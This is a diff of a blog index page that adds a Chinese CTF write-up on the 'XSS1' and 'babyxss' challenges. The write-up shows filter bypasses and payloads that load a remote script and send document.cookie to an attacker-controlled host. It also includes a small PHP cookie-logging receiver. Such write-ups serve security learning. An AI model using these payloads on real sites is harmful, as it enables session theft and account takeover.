@@ -232,6 +232,160 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/04/XSS1-babyxss再回顾/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Conlonial">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Conlonial's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/04/XSS1-babyxss再回顾/" itemprop="url">XSS1 & babyxss再回顾</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-04T17:23:08+08:00">
+                2019-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><center> XSS1 &amp; babyxss再回顾</center></p>
+<p><center>——XSS1——</center></p>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>XSS常用绕过(1)<blockquote>
+<p><a href="https://blog.csdn.net/hxsstar/article/details/21519301" target="_blank" rel="noopener">https://blog.csdn.net/hxsstar/article/details/21519301</a><br><a href="https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/" target="_blank" rel="noopener">https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/</a></p>
+</blockquote>
+</li>
+<li>常用绕过（2）<blockquote>
+<p><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">https://blog.csdn.net/qq_29277155/article/details/51320064</a></p>
+</blockquote>
+</li>
+<li><font color="#A52A2A">主动闭合标签实现注入代码部分</font><br>&gt; <a href="https://zhuanlan.zhihu.com/p/26177815" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26177815</a><br><font color="#A52A2A"> 利用引号闭合前引号，然后分号换行，加入代码，再闭合一个引号</font></li>
+<li>script标签嵌套<blockquote>
+<p><a href="https://bbs.csdn.net/topics/390415039" target="_blank" rel="noopener">https://bbs.csdn.net/topics/390415039</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>这道题整体思路是在构造xss绕过，将绕过payload以URL形式发送，同时还有MD5截断验证。flag在cookie中。绕过的规则源码在xss.php中，可以看到是将你输入的字符串中的<code>&quot;&quot;</code>,<code>&lt;&gt;</code>替换为空格，所以我们这里需要对这些符号进行转义。常见如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;#34;   &amp;quot;   &quot;     双引号</span><br><span class="line">&amp;#38;   &amp;amp;    &amp;     &amp;符号</span><br><span class="line">&amp;#60;	&amp;lt;	&lt; 	小于号</span><br><span class="line">&amp;#62;	&amp;gt;	&gt; 	大于号</span><br></pre></td></tr></table></figure></p>
+<p>这道题需要进行绕过分析，一直输验证码太麻烦所以我把源码复制下来，在本地进行测试。<br>同时，在检查源码时可以看到：<br><img src="https://i.imgur.com/5uBNDdS.png" alt="Imgur"><br>我们需要闭合前后的双引号。但是我们这道题不能照搬上例，因为我们后引号后没有分号，所以我选择用<code>//</code>把后面的整体注释掉。<br>所以我做了如下尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：&quot;;alert(1);//</span><br><span class="line">转义后：&amp;quot;;alert(1);//            本地可以弹窗</span><br></pre></td></tr></table></figure></p>
+<p>随后我就试着构造需要的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;;&lt;script src=http://xssye.com/V5uu&gt;&lt;/script&gt;;//</span><br><span class="line">转义后： &amp;quot;;&amp;lt;script src=http://xssye.com/V5uu&amp;gt;&amp;lt;/script&amp;gt;;//        失败</span><br></pre></td></tr></table></figure></p>
+<p>由于不清楚js标签的一些规则，这里陷入了瓶颈。突然想到hint提到了标签的问题，搜到script标签是不能直接嵌套script标签的，要用<code>documnet.write()</code><br>重新构造了payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;;document.write(&quot;&lt;script/src=http://xssye.com/V5uu&gt;&lt;/script&gt;&quot;);//</span><br><span class="line">转义后： &amp;quot;;document.write(&amp;quot;&amp;lt;script/src=http://xssye.com/V5uu&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;);//</span><br></pre></td></tr></table></figure></p>
+<p>在xss.php页面进行提交，将地址栏得到的URL作为payload进行提交，我发现在xss平台得不到cookie，这个问题困扰了好多天，并且由于用别人的平台我也不清楚到底出错在那里。我决定使用自己的服务器来做。（所以到最后我也不知道为啥用外面的平台我做不出来555）<br>接下来的问题就是在服务器略微配置，通过查看日志就可以看到cookie了并且我在github clone了清华的一个平台，也非常好用，接下来这道题我放弃了使用现成的XSS平台，转用自己的服务器很顺利的做出来了XSS1，并且重新做了babyxss。</p>
+<hr>
+<h3 id="1-直接在服务器获取"><a href="#1-直接在服务器获取" class="headerlink" title="1.直接在服务器获取"></a>1.直接在服务器获取</h3><ul>
+<li>参考：<a href="https://blog.csdn.net/qq_40273198/article/details/84328802" target="_blank" rel="noopener">https://blog.csdn.net/qq_40273198/article/details/84328802</a></li>
+</ul>
+<p>首先在服务器上配置LAMP后，在<code>/var/www/html</code>下建一个<code>get-cookie.php</code>的文件，代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cookie = $_GET[&apos;x&apos;];</span><br><span class="line">    file_put_contents(&apos;cookie.txt&apos;, $cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这里用babyxss举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;document.location=&apos;http://yourlocate/get-cookie.php?x=&apos;+document.cookie;&lt;/script&gt;          //在使用时根据需要进行编码转换</span><br></pre></td></tr></table></figure></p>
+<p>apache的<code>access log</code> 在<code>/var/log/apache2</code>中 用cat命令打开即可<br>效果如下：<img src="https://i.imgur.com/dO4qMLn.png" alt="Imgur"></p>
+<h3 id="2-使用数据接收平台"><a href="#2-使用数据接收平台" class="headerlink" title="2.使用数据接收平台"></a>2.使用数据接收平台</h3><ul>
+<li>链接：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a> 再配置，这个平台可以邮件通知<br>XSS1就是使用了这个平台<br>基本绕过思路同上，写一个payload试试</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:&quot;;ducoment.write(&quot;&lt;img src=http://yourlocate/xss/?cookie=&quot;+document.cookie+&quot; /&gt;&quot;);//</span><br><span class="line">编码后：&amp;quot;;document.write(&amp;quot;&amp;lt;img src=http://yourlocate/xss/?cookie=&amp;quot;+document.cookie+&amp;quot; /&amp;gt;&amp;quot;);//</span><br></pre></td></tr></table></figure>
+<p>最终的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss.php?name=%26quot%3B%3Bdocument.write%28%26quot%3B%26lt%3Bimg+src%3Dhttp%3A%2F%2Fyourlocate%2Fxss%2F%3Fcookie%3D%26quot%3B%2Bdocument.cookie%2B%26quot%3B+%2F%26gt%3B%26quot%3B%29%3B%2F%2F</span><br></pre></td></tr></table></figure></p>
+<p>提交后终于得到了cookie！<br><img src="https://i.imgur.com/n0zK969.png" alt="Imgur"><br>撒花完结！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/04/pwn-bof-baby-xss/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1419,125 +1573,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/19/post/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Conlonial">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Conlonial's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/19/post/" itemprop="url">post</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-19T22:38:34+08:00">
-                2019-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="python学习到基本数据类型，编写了例程"><a href="#python学习到基本数据类型，编写了例程" class="headerlink" title="python学习到基本数据类型，编写了例程"></a>python学习到基本数据类型，编写了例程</h1><h1 id="准备看书第三章的内容"><a href="#准备看书第三章的内容" class="headerlink" title="准备看书第三章的内容"></a>准备看书第三章的内容</h1>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1588,7 +1623,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
